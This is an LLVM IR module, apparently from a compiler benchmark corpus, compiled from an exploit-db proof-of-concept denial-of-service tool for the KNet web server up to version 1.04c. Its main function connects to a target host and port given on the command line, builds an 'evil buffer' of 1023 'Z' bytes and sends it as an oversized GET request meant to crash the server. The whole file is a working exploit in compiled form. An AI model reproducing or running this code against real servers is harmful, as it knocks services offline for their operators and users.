; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_25165.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_25165.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [56 x i8] c"\0A\0A-=[ KNet <= 1.04c PoC DoS ::: Coded by Expanders ]=-\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"\0A\0AConnecting to target \09...\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"[Done]\0ABuilding evil buffer\09...\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[Done]\0ASending evil request \09...\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"GET %s \0A\0D\0A\0D\00", align 1
@.str.5 = private unnamed_addr constant [41 x i8] c"[Done]\0A\0A[Finished] Check the server now\0A\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c"[Fail] -> Unable to connect\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [1024 x i8], align 16
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @help(i8* %20)
  %22 = call i32 @exit(i32 0) #4
  unreachable

23:                                               ; preds = %2
  %24 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %7, align 8
  %29 = load i32, i32* @AF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = call i32 @socket(i32 %29, i32 %30, i32 0)
  store i32 %31, i32* %9, align 4
  %32 = call i64 @malloc(i32 12344)
  %33 = inttoptr i64 %32 to i8*
  store i8* %33, i8** %14, align 8
  %34 = load i32, i32* @AF_INET, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 3
  store i32 %34, i32* %35, align 4
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 2
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38)
  %40 = call i32 @htons(i32 %39)
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %40, i32* %41, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %43 = load %struct.hostent*, %struct.hostent** %7, align 8
  %44 = getelementptr inbounds %struct.hostent, %struct.hostent* %43, i32 0, i32 0
  %45 = load i64, i64* %44, align 8
  %46 = inttoptr i64 %45 to %struct.in_addr*
  %47 = bitcast %struct.in_addr* %42 to i8*
  %48 = bitcast %struct.in_addr* %46 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %47, i8* align 4 %48, i64 4, i1 false)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %50 = call i32 @memset(i8* %49, i32 0, i32 8)
  %51 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  %52 = load i32, i32* %9, align 4
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  store i32 %54, i32* %11, align 4
  %55 = load i32, i32* %11, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %71

57:                                               ; preds = %23
  %58 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %59 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %60 = call i32 @memset(i8* %59, i32 90, i32 1023)
  %61 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %62 = load i8*, i8** %14, align 8
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %64 = call i32 @sprintf(i8* %62, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %63)
  %65 = load i32, i32* %9, align 4
  %66 = load i8*, i8** %14, align 8
  %67 = load i8*, i8** %14, align 8
  %68 = call i32 @strlen(i8* %67)
  %69 = call i32 @send(i32 %65, i8* %66, i32 %68, i32 0)
  %70 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  br label %73

71:                                               ; preds = %23
  %72 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %57
  %74 = load i32, i32* %9, align 4
  %75 = call i32 @close(i32 %74)
  ret i32 0
}

declare dso_local i32 @help(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
